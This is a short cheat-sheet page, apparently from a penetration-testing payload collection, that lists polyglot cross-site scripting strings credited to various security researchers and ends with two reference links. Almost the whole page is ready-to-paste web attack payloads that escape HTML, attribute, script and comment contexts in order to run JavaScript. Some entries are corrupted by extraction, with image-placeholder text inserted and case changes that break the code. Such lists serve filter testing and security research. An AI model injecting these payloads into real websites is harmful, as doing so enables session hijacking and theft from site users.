# polyglot xss

a polyglot xss is a type of cross-site scripting (xss) payload designed to work across multiple contexts within a web application, such as html, javascript, and attributes. it exploits the application’s inability to properly sanitize input in different parsing scenarios.

* polyglot xss - 0xsobky
    ```javascript
    javascript:/*-/*`/*\`/*'/*"/**/(/* */onclick=alert() )//%0d%0a%0d%0a//</style/</title/</textarea/</script/--!>\x3csvg/<svg/onload=alert()//>\x3e
    ```

* polyglot xss - ashar javed
    ```javascript
    ">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/xss/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'">
[image extracted text: [image not found]]
>
    ```

* polyglot xss - mathias karlsson
    ```javascript
    " onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
    ```

* polyglot xss - rsnake
    ```javascript
    ';alert(string.fromcharcode(88,83,83))//';alert(string. fromcharcode(88,83,83))//";alert(string.fromcharcode (88,83,83))//";alert(string.fromcharcode(88,83,83))//-- ></script>">'><script>alert(string.fromcharcode(88,83,83)) </script>
    ```

* polyglot xss - daniel miessler
    ```javascript
    ';alert(string.fromcharcode(88,83,83))//';alert(string.fromcharcode(88,83,83))//";alert(string.fromcharcode(88,83,83))//";alert(string.fromcharcode(88,83,83))//--></script>">'><script>alert(string.fromcharcode(88,83,83))</script>
    “ onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
    '">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/xss/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'">
[image extracted text: [image not found]]
>
    javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*
    javascript://--></script></title></style>"/</textarea>*/<alert()/*' onclick=alert()//>a
    javascript://</title>"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/
    javascript://</title></style></textarea>--></script><a"//' onclick=alert()//>*/alert()/*
    javascript://'//" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*
    javascript://</title></textarea></style></script --><li '//" '*/alert()/*', onclick=alert()//
    javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*
    --></script></title></style>"/</textarea><a' onclick=alert()//>*/alert()/*
    /</title/'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/*
    javascript://--></title></style></textarea></script><svg "//' onclick=alert()//
    /</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*
    ```


*  polyglot xss - [@s0md3v](https://twitter.com/s0md3v/status/966175714302144514)
    
[image extracted text: [image not found]]

    ```javascript
    -->'"/></script><svg x=">" onload=(co\u006efirm)``>
    ```

    
[image extracted text: [image not found]]

    ```javascript
    <svg%0ao%00nload=%09((pro\u006dpt))()//
    ```

* polyglot xss - from [@filedescriptor's polyglot challenge](https://web.archive.org/web/20190617111911/https://polyglot.innerht.ml/)
    ```javascript
    // author: crlf
    javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>

    // author: europa
    javascript:"/*'/*`/*\" /*</title></style></textarea></noscript></noembed></template></script/-->&lt;svg/onload=/*<html/*/onmouseover=alert()//>

    // author: edoverflow
    javascript:"/*\"/*`/*' /*</template></textarea></noembed></noscript></title></style></script>-->&lt;svg onload=/*<html/*/onmouseover=alert()//>

    // author: h1/ragnar
    javascript:`//"//\"//</title></textarea></style></noscript></noembed></script></template>&lt;svg/onload='/*--><html */ onmouseover=alert()//'>`
    ```

* polyglot xss - from [brutelogic](https://brutelogic.com.br/blog/building-xss-polyglots/)
    ```javascript
    javascript://%250aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></title/</style/</script/</textarea/</iframe/</noscript>\74k<k/contenteditable/autofocus/onfocus=/*${/*/;{/**/(alert)(1)}//><base/href=//x55.is\76-->
    ```


## references

- [building xss polyglots - brute - june 23, 2021](https://brutelogic.com.br/blog/building-xss-polyglots/)
- [xss polyglot challenge v2 - @filedescriptor - august 20, 2015](https://web.archive.org/web/20190617111911/https://polyglot.innerht.ml/)